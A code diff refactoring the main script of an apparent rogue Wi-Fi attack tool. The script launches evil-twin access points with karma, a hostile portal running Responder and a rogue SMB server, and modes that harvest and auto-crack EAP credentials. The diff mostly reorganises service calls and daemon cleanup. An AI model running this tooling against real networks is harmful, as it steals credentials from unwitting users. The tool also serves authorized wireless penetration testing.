@@ -5,7 +5,7 @@ import os
 import config
 import time
 
-from core import cert_manager, conf_manager, utils, responder
+from core import cert_manager, conf_manager, utils, responder, services
 from core.servers.redirect_server import RedirectServer
 from core.autocrack import Autocrack
 from argparse import ArgumentParser
@@ -15,13 +15,16 @@ def cert_wizard():
 
     while True:
 
-        print '[*] Please enter two letter country code for certs (i.e. US, FR)'
+        print ('[*] Please enter two letter country '
+                            'code for certs (i.e. US, FR)')
+
         country = raw_input(': ').upper()
         if len(country) == 2:
             break
         print '[!] Invalid input.'
 
-    print '[*] Please enter state or province for certs (i.e. Ontario, New Jersey)'
+    print ('[*] Please enter state or province for '
+                        'certs (i.e. Ontario, New Jersey)')
     state = raw_input(': ')
 
     print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
@@ -45,6 +48,8 @@ def cert_wizard():
 def hostile_portal():
     global responder
 
+    daemons = []
+
     try:
     
         # start autocrack if enabled
@@ -53,6 +58,7 @@ def hostile_portal():
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
+            daemons.append(autocrack)
 
         # prepare environment
         utils.nmcli.set_unmanaged(options['interface'])
@@ -60,55 +66,64 @@ def hostile_portal():
 
         # initialize access point
         if options['auth'] == 'open':
-            conf_manager.hostapd_open_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'],
-											cloaking=options['cloaking'],
-                                            karma=options['karma'])
+            conf_manager.hostapd_open_cnf.configure(
+                        interface=options['interface'],
+                        ssid=options['essid'],
+                        hw_mode=options['hw_mode'],
+                        bssid=options['bssid'],
+                        channel=options['channel'],
+                        cloaking=options['cloaking'],
+                        karma=options['karma'],
+            )
         else:
-            conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'],
-                                            wpa=options['wpa'],
-                                            karma=options['karma'],
-                                            use_autocrack=options['use_autocrack'],
-											cloaking=options['cloaking'],
-                                            eaphammer_fifo_path=config.fifo_path)
+            conf_manager.hostapd_wpe_cnf.configure(
+                        interface=options['interface'],
+                        ssid=options['essid'],
+                        hw_mode=options['hw_mode'],
+                        bssid=options['bssid'],
+                        channel=options['channel'],
+                        wpa=options['wpa'],
+                        karma=options['karma'],
+                        use_autocrack=options['use_autocrack'],
+                        cloaking=options['cloaking'],
+                        eaphammer_fifo_path=config.fifo_path,
+            )
 
-        utils.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
+        services.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
-        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
+        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' %\
+                                                         options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
         # configure dnsmasq
         conf_manager.dnsmasq_captive_portal_cnf.configure(
                                         interface=options['interface'],
                                         log_file=config.dnsmasq_log,
-                                        dhcp_script=config.dhcp_script)
+                                        dhcp_script=config.dhcp_script,
+        )
         
-        utils.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
+        services.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
 
         # start RedirectServer
         rs = RedirectServer.get_instance()
         rs.configure('10.0.0.1')
         rs.start()
+        daemons.append(rs)
 
         # start Responder
         if options['pivot']:
 
             print '[*] Pivot mode activated. Rogue SMB server disabled.'
-            print '[*] Run payload_generator to generate a timed payload if desired.'
+            print ('[*] Run payload_generator to '
+                        'generate a timed payload if desired.')
             conf_manager.responder_cnf.configure(smb=False)
         else:
             conf_manager.responder_cnf.configure(smb=True)
         resp = responder.Responder.get_instance()
         resp.configure(interface=options['interface'])
         resp.start()
+        daemons.append(resp)
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -122,14 +137,14 @@ def hostile_portal():
         # pause execution until user quits
         raw_input('Press enter to quit...')
 
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        resp.stop()
-        rs.stop()
-        if options['use_autocrack']:
-            autocrack.stop()
-        
+        # kill base services
+        services.Hostapd.kill()
+        services.Dnsmasq.kill()
+
+        # stop additional daemon processes
+        for d in daemons:
+            d.stop()
+
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
         utils.Iptables.flush()
@@ -142,14 +157,13 @@ def hostile_portal():
 
     except KeyboardInterrupt:
     
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
-        resp.stop()
-        rs.stop()
-        if options['use_autocrack']:
-            autocrack.stop()
+        # terminate base services
+        services.Hostapd.kill()
+        services.Dnsmasq.kill()
+
+        # stop additional daemon processes
+        for d in daemons:
+            d.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -160,6 +174,8 @@ def hostile_portal():
         utils.nmcli.set_managed(options['interface'])
 
 def captive_portal():
+
+    daemons = []
 
     try:
 
@@ -173,32 +189,38 @@ def captive_portal():
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
+            daemons.append(autocrack)
 
         # initialize access point
         if options['auth'] == 'open':
-            conf_manager.hostapd_open_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'],
-											cloaking=options['cloaking'],
-                                            karma=options['karma'])
+            conf_manager.hostapd_open_cnf.configure(
+                        interface=options['interface'],
+                        ssid=options['essid'],
+                        hw_mode=options['hw_mode'],
+                        bssid=options['bssid'],
+                        channel=options['channel'],
+						cloaking=options['cloaking'],
+                        karma=options['karma'],
+            )
         else:
-            conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'],
-                                            wpa=options['wpa'],
-                                            karma=options['karma'],
-											cloaking=options['cloaking'],
-                                            use_autocrack=options['use_autocrack'],
-                                            eaphammer_fifo_path=config.fifo_path)
+            conf_manager.hostapd_wpe_cnf.configure(
+                        interface=options['interface'],
+                        ssid=options['essid'],
+                        hw_mode=options['hw_mode'],
+                        bssid=options['bssid'],
+                        channel=options['channel'],
+                        wpa=options['wpa'],
+                        karma=options['karma'],
+						cloaking=options['cloaking'],
+                        use_autocrack=options['use_autocrack'],
+                        eaphammer_fifo_path=config.fifo_path,
+            )
 
-        utils.Hostapd.hardstart('%s' % config.hostapd_cnf, verbose=False)
+        services.Hostapd.hardstart('%s' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
-        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
+        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' %\
+                                                     options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
         # configure dnsmasq
@@ -207,10 +229,10 @@ def captive_portal():
                                         log_file=config.dnsmasq_log,
                                         dhcp_script=config.dhcp_script)
         
-        utils.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
+        services.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
 
         # start httpd
-        utils.Httpd.start()
+        services.Httpd.start()
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -224,14 +246,14 @@ def captive_portal():
         # pause execution until user quits
         raw_input('press enter to quit...')
 
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        if options['use_autocrack']:
-            autocrack.stop()
+        # terminate base services
+        services.Hostapd.kill()
+        services.Dnsmasq.kill()
+        services.Httpd.stop()
 
-        # stop services
-        utils.Httpd.stop()
+        # stop additional daemon processes
+        for d in daemons:
+            d.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -243,11 +265,14 @@ def captive_portal():
 
     except KeyboardInterrupt:
 
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        if options['use_autocrack']:
-            autocrack.stop()
+        # terminate base services
+        services.Hostapd.kill()
+        services.Dnsmasq.kill()
+        utils.Httpd.stop()
+
+        # stop additional daemon processes
+        for d in daemons:
+            d.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -260,6 +285,8 @@ def captive_portal():
 def reap_creds():
 
     try:
+    
+        daemons = []
 
         # start autocrack if enabled
         if options['use_autocrack']:
@@ -267,35 +294,45 @@ def reap_creds():
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
+            daemons.append(autocrack)
 
-        conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
-                                        ssid=options['essid'],
-                                        hw_mode=options['hw_mode'],
-                                        bssid=options['bssid'],
-                                        channel=options['channel'],
-                                        wpa=options['wpa'],
-                                        karma=options['karma'],
-										cloaking=options['cloaking'],
-                                        use_autocrack=options['use_autocrack'],
-                                        eaphammer_fifo_path=config.fifo_path)
+        conf_manager.hostapd_wpe_cnf.configure(
+                    interface=options['interface'],
+                    ssid=options['essid'],
+                    hw_mode=options['hw_mode'],
+                    bssid=options['bssid'],
+                    channel=options['channel'],
+                    wpa=options['wpa'],
+                    karma=options['karma'],
+                    cloaking=options['cloaking'],
+                    use_autocrack=options['use_autocrack'],
+                    eaphammer_fifo_path=config.fifo_path,
+        ) 
 
         utils.nmcli.set_unmanaged(options['interface'])
-        utils.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
+        services.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
 
         # pause execution until user quits
         raw_input('press enter to quit...')
 
-        utils.Hostapd.kill()
+        # kill hostapd
+        services.Hostapd.kill()
+
+        # kill additional daemon processes
+        for d in daemons:
+            d.stop()
 
         # cleanly allow network manager to regain control of interface
         utils.nmcli.set_managed(options['interface'])
 
     except KeyboardInterrupt:
-    
-        # kill daemons
-        utils.Hostapd.kill()
-        if options['use_autocrack']:
-            autocrack.stop()
+
+        # kill hostapd
+        services.Hostapd.kill()
+
+        # kill additional daemon processes
+        for d in daemons:
+            d.stop()
 
         # cleanly allow network manager to regain control of interface
         utils.nmcli.set_managed(options['interface'])
@@ -308,7 +345,8 @@ def set_options():
     parser.add_argument('--cert-wizard',
                     dest='cert_wizard',
                     action='store_true',
-                    help='Use this flag to create a new RADIUS cert for your AP')
+                    help=('Use this flag to create a new '
+                          'RADIUS cert for your AP'))
 
     parser.add_argument('-i', '--interface',
                     dest='interface',
@@ -360,8 +398,8 @@ def set_options():
 					help='Send empty SSID in beacons and ignore probe request '
 						 'frames that do not specify full SSID (i.e. require '
 						 'stations to know SSID). Choices: [1. none - do '
-						 'not use SSID cloaking. ] [2. full - Send empty string '
-						 'in beacon and ignore probe requests for broadcast '
+						 'not use SSID cloaking. ] [2. full - Send empty string'
+						 ' in beacon and ignore probe requests for broadcast '
 						 'SSID ] [3. zeroes - Replace all characters in SSID '
 						 'with ASCII 0 and ignore probe requests for '
 						 'broadcast SSID.]')
@@ -401,7 +439,8 @@ def set_options():
                     dest='wordlist',
                     default=config.default_wordlist,
                     type=str,
-                    help='Specify the wordlist to use with the autocrack feature.')
+                    help='Specify the wordlist to use with '
+                         'the autocrack feature.')
 
     parser.add_argument('--local-autocrack',
                     dest='local_autocrack',
@@ -418,13 +457,17 @@ def set_options():
         
 
             parser.print_usage()
+            msg = (
+                '[!] Please specify a valid PHY '
+                'interface using the --interface flag'
+            )
             print
-            print 'Please specify a valid PHY interface using the --interface flag'
+            print msg
             sys.exit()
 
     if options['remote_autocrack'] is not None:
         print
-        print 'This feature has not been implemented yet.'
+        print '[!] This feature has not been implemented yet.'
         sys.exit()
         options['use_autocrack'] = True
     elif options['local_autocrack']:
